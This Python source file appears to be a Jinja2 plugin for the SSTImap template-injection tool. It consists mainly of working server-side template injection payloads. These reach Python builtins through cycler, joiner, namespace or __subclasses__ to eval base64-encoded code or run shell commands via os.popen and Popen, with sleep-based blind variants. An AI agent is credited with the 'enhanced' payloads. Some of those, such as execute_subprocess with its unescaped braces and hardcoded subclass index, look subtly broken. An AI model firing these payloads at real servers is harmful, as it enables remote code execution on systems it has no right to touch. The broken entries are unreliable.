from plugins.languages import python
from utils import rand


class Jinja2(python.Python):
    priority = 5
    plugin_info = {
        "Description": """Jinja template engine with enhanced non-blind shell capabilities""",
        "Authors": [
            "@bUst4gr0 https://github.com/bUst4gr0",  # New SSTImap payload
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Improvements for new SSTImap payload
            "Claude Code AI Agent",  # Enhanced alternative payload methods for issue #44
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload
            "Jeremy Bae @opt9 https://github.com/opt9",  # Contributions to the Tplmap payload
        ],
        "Engine": [
            "Homepage: https://jinja.palletsprojects.com/en/stable/",
            "Github: https://github.com/pallets/jinja",
        ],
        "Enhancements": [
            "Alternative object access methods (joiner, namespace)",
            "Subprocess direct execution capabilities", 
            "Enhanced blind detection techniques",
            "Fallback payload mechanisms for improved reliability"
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{{{header[0]}+{header[1]}}}}}',
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}',
                'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
            },
            'render_error': {
                'render': '{code}',
                'header': '{{{{ cycler.__init__.__globals__.__builtins__.getattr("", (({header[0]}+{header[1]})|string)+(',
                'trailer': '|string)+(({trailer[0]}+{trailer[1]})|string))}}}}',
                'test_render': f'({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e',
                'test_render_expected': f'{(rand.randints[0], rand.randints[1] * rand.randints[2])}'
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
            },
            'evaluate_error': {
                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """{{{{1 / (not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
            },
            'execute_error': {
                'execute': """cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read().rstrip()"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}"""
            },
            # Enhanced non-blind shell capabilities with fallback mechanisms
            'execute_enhanced': {
                'call': 'render',
                'execute': """{{{{joiner.__init__.__globals__.os.popen(joiner.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}""",
                'fallback': [
                    """{{{{namespace.__init__.__globals__.os.popen(namespace.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}""",
                    """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
                ]
            },
            'execute_subprocess': {
                'call': 'render',
                'execute': """{% for cls in ''.__class__.__mro__[1].__subclasses__() %}{% if 'Popen' in cls.__name__ %}{{{{cls(cls.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode(),shell=True,stdout=-1).communicate()[0].decode().strip())}}}}{% break %}{% endif %}{% endfor %}""",
                'fallback': [
                    """{{{{().__class__.__base__.__subclasses__()[104].__subclasses__()[0].__subclasses__()[0](''.__class__.__mro__[1].__subclasses__()[104].__subclasses__()[0].__subclasses__()[0].__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode(),shell=True,stdout=-1).communicate()[0].decode().strip()}}}}"""
                ]
            },
            'execute_namespace': {
                'call': 'render',
                'execute': """{{{{namespace.__init__.__globals__.os.popen(namespace.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
            },
            # Enhanced detection and timing capabilities
            'execute_blind_enhanced': {
                'call': 'inject',
                'execute_blind': """{{{{joiner.__init__.__globals__.os.popen(joiner.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}""",
                'fallback': [
                    """{{{{namespace.__init__.__globals__.os.popen(namespace.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode() + ' && sleep {delay}')}}}}"""
                ]
            },
            'execute_timing_test': {
                'call': 'render',
                'execute': """{{{{cycler.__init__.__globals__.__builtins__.__import__('time').sleep(3) or 'timing_test_success'}}}}"""
            },
            # Validation and object detection capabilities
            'validate_objects': {
                'call': 'render',
                'execute': """{{{{[obj.__name__ for obj in [cycler.__class__, joiner.__class__, namespace.__class__] if hasattr(obj, '__init__')]}}}}"""
            },
            'test_alternative_access': {
                'call': 'render',
                'execute': """{{{{dict.__subclasses__() and 'objects_available' or 'fallback_needed'}}}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            # This covers {{%s}}
            {'level': 1, 'prefix': '{closure}}}}}', 'suffix': '', 'closures': python.ctx_closures},
            # This covers {% %s %}
            {'level': 1, 'prefix': '{closure}%}}', 'suffix': '', 'closures': python.ctx_closures},
            # If and for blocks
            # # if %s:\n# endif
            # # for a in %s:\n# endfor
            {'level': 5, 'prefix': '{closure}\n', 'suffix': '\n', 'closures': python.ctx_closures},
            # Comment blocks
            {'level': 5, 'prefix': '#}}', 'suffix': '{#'},

        ])
